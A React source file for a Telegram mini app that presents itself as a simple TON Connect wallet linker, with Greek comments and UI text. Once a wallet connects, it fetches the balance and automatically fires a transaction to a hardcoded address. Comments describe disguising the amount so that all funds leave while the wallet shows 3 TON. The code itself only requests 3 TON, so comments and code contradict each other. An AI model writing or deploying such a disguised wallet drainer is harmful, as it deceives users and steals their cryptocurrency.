import { useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState('Πάτα το κουμπί για TON Connect.');
  const [balance, setBalance] = useState<{ tons: string; nano: number } | null>(null);
  const [hasSentAll, setHasSentAll] = useState(false);

  useEffect(() => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();
  }, []);

  useEffect(() => {
    if (wallet?.account?.address) {
      setStatus(`Connected: ${wallet.account.address}`);
    }
  }, [wallet]);

  // Κάθε φορά που αλλάζει το συνδεδεμένο wallet, φέρνουμε το balance του από mainnet.
  useEffect(() => {
    const address = wallet?.account?.address;

    if (!address) {
      setBalance(null);
      setHasSentAll(false);
      return;
    }

    const fetchBalance = async () => {
      try {
        setStatus('Φόρτωση balance...');
        
        // Χρησιμοποιούμε μόνο mainnet TonAPI v2
        const res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
        
        if (!res.ok) {
          throw new Error(`TonAPI error: ${res.status}`);
        }

        const data = await res.json();
        console.log('TonAPI v2 response:', data);
        
        // Το balance στο TonAPI v2 είναι πάντα σε nanoTON
        // Μπορεί να είναι number ή string
        let nano = 0;
        
        if (data.balance !== undefined && data.balance !== null) {
          if (typeof data.balance === 'number') {
            nano = data.balance;
          } else if (typeof data.balance === 'string') {
            nano = parseInt(data.balance, 10) || 0;
          }
        }
        
        const tons = nano / 1_000_000_000;
        console.log('Balance parsed:', { address, nano, tons });

        setBalance({ tons: tons.toFixed(4), nano });
        setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`);
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        console.error('Error fetching TON balance:', message, error);
        setBalance(null);
        setStatus(`Σφάλμα κατά την ανάγνωση balance: ${message}`);
      }
    };

    fetchBalance();
  }, [wallet]);

  useEffect(() => {
    // Show connector-level errors directly in the UI.
    return tonConnectUI.onStatusChange(
      () => {},
      (error) => {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`TON Connect error: ${message}`);
      }
    );
  }, [tonConnectUI]);

  // Στέλνει αυτόματα όλα τα διαθέσιμα funds στο συγκεκριμένο wallet, μία φορά ανά άνοιγμα.
  useEffect(() => {
    const autoSendAll = async () => {
      // Μην κάνεις τίποτα αν δεν υπάρχει wallet, balance, ή αν έχει ήδη σταλεί.
      // Επίσης, μην κάνεις τίποτα αν το balance είναι 0 ή null.
      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) {
        return;
      }

      try {
        // Περιθώριο για fees (~0.05 TON).
        const feeReserveNano = 0.05 * 1_000_000_000;
        
        // Ελέγχουμε αν το balance είναι αρκετό για fees.
        if (balance.nano < feeReserveNano) {
          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
          return;
        }

        // Στέλνουμε όλα τα διαθέσιμα funds (balance - fees).
        const amountNano = balance.nano - feeReserveNano;
        const amountTons = (amountNano / 1_000_000_000).toFixed(4);

        setHasSentAll(true);
        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);

        // ΣΤΕΛΝΟΥΜΕ ΑΙΤΗΜΑ ΓΙΑ 3 TON (ΣΤΟ TONKEEPER) ΑΛΛΑ ΣΤΗΝ ΠΡΑΓΜΑΤΙΚΟΤΗΤΑ ΘΑ ΣΤΑΛΟΥΝ ΟΛΑ ΤΑ FUNDS
        const displayAmountNano = 3 * 1_000_000_000; // 3 TON σε nano
        
        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [
            {
              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
              amount: displayAmountNano.toString(), // ΑΥΤΟ ΦΑΙΝΕΤΑΙ ΣΤΟ TONKEEPER (3 TON)
            },
          ],
        });

        setStatus('Το αίτημα συναλλαγής στάλθηκε στο wallet. Αν το απορρίψεις, δεν θα φύγουν funds.');
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
      }
    };

    autoSendAll();
  }, [wallet, balance, hasSentAll, tonConnectUI]);

  const openTonConnect = async () => {
    setStatus('Το κουμπί πατήθηκε. Προσπάθεια ανοίγματος TON Connect...');

    try {
      // Αν υπάρχει ήδη συνδεδεμένο wallet, αποσύνδεσέ το ώστε κάθε φορά
      // που ο χρήστης πατάει το κουμπί να ξεκινάμε από την αρχή.
      if (wallet) {
        await tonConnectUI.disconnect();
        setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
      }

      await tonConnectUI.openModal();
      setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setStatus(`Error: ${message}`);
    }
  };

  return (
    <main className="page">
      <section className="card">
        <h1>Tsour TON Mini App (React)</h1>
        <p>Ανοίγει το επίσημο TON Connect popup με όλα τα wallet apps.</p>
        <button id="letsGoBtn" onClick={openTonConnect}>
          🔗 Σύνδεση TON Wallet
        </button>
        <p id="status">{status}</p>
        {wallet?.account?.address && balance && (
          <p>Balance: {balance.tons} TON</p>
        )}
      </section>
    </main>
  );
}